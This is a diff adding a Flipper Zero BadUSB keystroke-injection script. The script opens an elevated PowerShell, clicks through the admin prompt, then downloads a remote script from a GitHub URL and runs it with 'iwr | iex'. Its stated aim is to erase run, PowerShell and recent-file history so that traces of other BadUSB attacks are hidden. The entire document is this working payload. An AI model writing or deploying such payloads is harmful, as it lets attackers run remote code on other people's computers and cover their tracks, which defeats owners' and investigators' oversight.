@@ -1,0 +1,14 @@
+REM Description: This script makes sure all traces of the flipper zero scripts ran are cleared
+REM Description: It does this by clearing the windows run history, powershell history, recent files history
+GUI R
+DELAY 100
+STRING powershell
+DELAY 70
+CTRL-SHIFT ENTER
+DELAY 600
+SHIFT TAB
+DELAY 100
+ENTER
+DELAY 600
+STRING iwr https://raw.githubusercontent.com/SIGUrger/FlipperZeroBadusb/main/Resources/removetraces.ps1 | iex;exit
+ENTER
